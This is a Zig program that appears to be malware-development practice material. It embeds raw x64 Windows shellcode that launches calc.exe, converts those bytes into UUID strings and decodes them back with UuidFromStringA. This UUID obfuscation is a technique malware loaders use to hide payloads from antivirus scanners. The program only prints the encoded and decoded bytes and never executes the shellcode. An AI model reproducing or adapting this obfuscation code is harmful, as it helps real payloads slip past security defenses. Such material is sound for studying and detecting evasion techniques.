const std = @import("std");
const win = std.os.windows;
const assert = std.debug.assert;

const WINAPI = win.WINAPI;
const BOOLEAN = win.BOOLEAN;
const NTSTATUS = win.NTSTATUS;
const LPSTR = win.LPSTR;
const Guid = extern union {
    Ints: extern struct {
        a: u32,
        b: u16,
        c: u16,
        d: [8]u8,
    },
    Bytes: [16]u8,
};
const RPC_STATUS = enum(i32) {
    RPC_S_OK = 0,
    RPC_S_INVALID_STRING_BINDING = 1700,
    RPC_S_WRONG_KIND_OF_BINDING = 1701,
    RPC_S_INVALID_BINDING = 1702,
    RPC_S_PROTSEQ_NOT_SUPPORTED = 1703,
    RPC_S_INVALID_RPC_PROTSEQ = 1704,
    RPC_S_INVALID_STRING_UUID = 1705,
    RPC_S_INVALID_ENDPOINT_FORMAT = 1706,
    RPC_S_INVALID_NET_ADDR = 1707,
    RPC_S_NO_ENDPOINT_FOUND = 1708,
    RPC_S_INVALID_TIMEOUT = 1709,
    RPC_S_OBJECT_NOT_FOUND = 1710,
    RPC_S_ALREADY_REGISTERED = 1711,
    RPC_S_TYPE_ALREADY_REGISTERED = 1712,
    RPC_S_ALREADY_LISTENING = 1713,
    RPC_S_NO_PROTSEQS_REGISTERED = 1714,
    RPC_S_NOT_LISTENING = 1715,
    RPC_S_UNKNOWN_MGR_TYPE = 1716,
    RPC_S_UNKNOWN_IF = 1717,
    RPC_S_NO_BINDINGS = 1718,
    RPC_S_NO_PROTSEQS = 1719,
    RPC_S_CANT_CREATE_ENDPOINT = 1720,
    RPC_S_OUT_OF_RESOURCES = 1721,
    RPC_S_SERVER_UNAVAILABLE = 1722,
    RPC_S_SERVER_TOO_BUSY = 1723,
    RPC_S_INVALID_NETWORK_OPTIONS = 1724,
    RPC_S_NO_CALL_ACTIVE = 1725,
    RPC_S_CALL_FAILED = 1726,
    RPC_S_CALL_FAILED_DNE = 1727,
    RPC_S_PROTOCOL_ERROR = 1728,
    RPC_S_PROXY_ACCESS_DENIED = 1729,
    RPC_S_UNSUPPORTED_TRANS_SYN = 1730,
    RPC_S_UNSUPPORTED_TYPE = 1732,
    RPC_S_INVALID_TAG = 1733,
    RPC_S_INVALID_BOUND = 1734,
    RPC_S_NO_ENTRY_NAME = 1735,
    RPC_S_INVALID_NAME_SYNTAX = 1736,
    RPC_S_UNSUPPORTED_NAME_SYNTAX = 1737,
    RPC_S_UUID_NO_ADDRESS = 1739,
    RPC_S_DUPLICATE_ENDPOINT = 1740,
    RPC_S_UNKNOWN_AUTHN_TYPE = 1741,
    RPC_S_MAX_CALLS_TOO_SMALL = 1742,
    RPC_S_STRING_TOO_LONG = 1743,
    RPC_S_PROTSEQ_NOT_FOUND = 1744,
    RPC_S_PROCNUM_OUT_OF_RANGE = 1745,
    RPC_S_BINDING_HAS_NO_AUTH = 1746,
    RPC_S_UNKNOWN_AUTHN_SERVICE = 1747,
    RPC_S_UNKNOWN_AUTHN_LEVEL = 1748,
    RPC_S_INVALID_AUTH_IDENTITY = 1749,
    RPC_S_UNKNOWN_AUTHZ_SERVICE = 1750,
    EPT_S_INVALID_ENTRY = 1751,
    EPT_S_CANT_PERFORM_OP = 1752,
    EPT_S_NOT_REGISTERED = 1753,
    RPC_S_NOTHING_TO_EXPORT = 1754,
    RPC_S_INCOMPLETE_NAME = 1755,
    RPC_S_INVALID_VERS_OPTION = 1756,
    RPC_S_NO_MORE_MEMBERS = 1757,
    RPC_S_NOT_ALL_OBJS_UNEXPORTED = 1758,
    RPC_S_INTERFACE_NOT_FOUND = 1759,
    RPC_S_ENTRY_ALREADY_EXISTS = 1760,
    RPC_S_ENTRY_NOT_FOUND = 1761,
    RPC_S_NAME_SERVICE_UNAVAILABLE = 1762,
    RPC_S_INVALID_NAF_ID = 1763,
    RPC_S_CANNOT_SUPPORT = 1764,
    RPC_S_NO_CONTEXT_AVAILABLE = 1765,
    RPC_S_INTERNAL_ERROR = 1766,
    RPC_S_ZERO_DIVIDE = 1767,
    RPC_S_ADDRESS_ERROR = 1768,
    RPC_S_FP_DIV_ZERO = 1769,
    RPC_S_FP_UNDERFLOW = 1770,
    RPC_S_FP_OVERFLOW = 1771,
    RPC_S_CALL_IN_PROGRESS = 1791,
    RPC_S_NO_MORE_BINDINGS = 1806,
    RPC_S_NO_INTERFACES = 1817,
    RPC_S_CALL_CANCELLED = 1818,
    RPC_S_BINDING_INCOMPLETE = 1819,
    RPC_S_COMM_FAILURE = 1820,
    RPC_S_UNSUPPORTED_AUTHN_LEVEL = 1821,
    RPC_S_NO_PRINC_NAME = 1822,
    RPC_S_NOT_RPC_ERROR = 1823,
    RPC_S_UUID_LOCAL_ONLY = 1824,
    RPC_S_SEC_PKG_ERROR = 1825,
    RPC_S_NOT_CANCELLED = 1826,
    RPC_S_COOKIE_AUTH_FAILED = 1833,
    RPC_S_DO_NOT_DISTURB = 1834,
    RPC_S_SYSTEM_HANDLE_COUNT_EXCEEDED = 1835,
    RPC_S_SYSTEM_HANDLE_TYPE_MISMATCH = 1836,
    RPC_S_GROUP_MEMBER_NOT_FOUND = 1898,
    EPT_S_CANT_CREATE = 1899,
    RPC_S_INVALID_OBJECT = 1900,
    RPC_S_SEND_INCOMPLETE = 1913,
    RPC_S_INVALID_ASYNC_HANDLE = 1914,
    RPC_S_INVALID_ASYNC_CALL = 1915,
    RPC_S_ENTRY_TYPE_MISMATCH = 1922,
    RPC_S_NOT_ALL_OBJS_EXPORTED = 1923,
    RPC_S_INTERFACE_NOT_EXPORTED = 1924,
    RPC_S_PROFILE_NOT_ADDED = 1925,
    RPC_S_PRF_ELT_NOT_ADDED = 1926,
    RPC_S_PRF_ELT_NOT_REMOVED = 1927,
    RPC_S_GRP_ELT_NOT_ADDED = 1928,
    RPC_S_GRP_ELT_NOT_REMOVED = 1929,
};

extern "rpcrt4" fn UuidFromStringA(
    StringUuid: ?*u8,
    Uuid: ?*Guid,
) callconv(WINAPI) RPC_STATUS;

fn generateUUid(allocator: std.mem.Allocator, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8, m: u8, n: u8, o: u8, p: u8) ![:0]u8 {
    return std.fmt.allocPrintZ(allocator, "{X:0>2}{X:0>2}{X:0>2}{X:0>2}-{X:0>2}{X:0>2}-{X:0>2}{X:0>2}-{X:0>2}{X:0>2}-{X:0>2}{X:0>2}{X:0>2}{X:0>2}{X:0>2}{X:0>2}", .{ d, c, b, a, f, e, h, g, i, j, k, l, m, n, o, p });
}

fn generateUUidOutput(allocator: std.mem.Allocator, shell_code: []const u8) ![][:0]const u8 {
    assert(shell_code.len % 16 == 0);

    var uuid_array = try std.ArrayList([:0]const u8).initCapacity(allocator, shell_code.len / 16);

    var i: usize = 0;
    while (i < shell_code.len) : (i += 16) {
        const uuid = try generateUUid(allocator, shell_code[i], shell_code[i + 1], shell_code[i + 2], shell_code[i + 3], shell_code[i + 4], shell_code[i + 5], shell_code[i + 6], shell_code[i + 7], shell_code[i + 8], shell_code[i + 9], shell_code[i + 10], shell_code[i + 11], shell_code[i + 12], shell_code[i + 13], shell_code[i + 14], shell_code[i + 15]);
        uuid_array.appendAssumeCapacity(uuid);
    }

    return uuid_array.toOwnedSlice();
}

fn uuidDeobfuscation(allocator: std.mem.Allocator, uuid_array: [][:0]const u8) ![]u8 {
    var shell_code = try std.ArrayList(u8).initCapacity(allocator, uuid_array.len * 16);
    errdefer shell_code.deinit();

    for (uuid_array) |string_uuid| {
        var uuid: Guid = undefined;

        const status = UuidFromStringA(@ptrCast(@constCast(string_uuid)), &uuid);
        if (status != .RPC_S_OK) {
            std.debug.print("UUIDDeobfuscationFailed with error: {s}\n", .{@tagName(status)});
            return error.UUIDDeobfuscationFailed;
        }

        shell_code.appendSliceAssumeCapacity(&uuid.Bytes);
    }

    return shell_code.toOwnedSlice();
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shell_code = [_]u8{
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x00,
    };

    std.debug.print("shell_code: {x}\n", .{shell_code});

    const uuid_array = try generateUUidOutput(allocator, &shell_code);
    defer {
        for (uuid_array) |uuid| allocator.free(uuid);
        allocator.free(uuid_array);
    }

    std.debug.print("obfuscated shell_code = [", .{});
    for (uuid_array, 0..) |uuid, i| {
        if (i == uuid_array.len - 1) std.debug.print("\"{s}\"", .{uuid}) else std.debug.print("\"{s}\", ", .{uuid});
    }
    std.debug.print("]\n", .{});

    const deobfuscated_shell_code = try uuidDeobfuscation(allocator, uuid_array);
    defer allocator.free(deobfuscated_shell_code);

    std.debug.print("deobfuscated_shell_code: {x}\n", .{deobfuscated_shell_code});
}
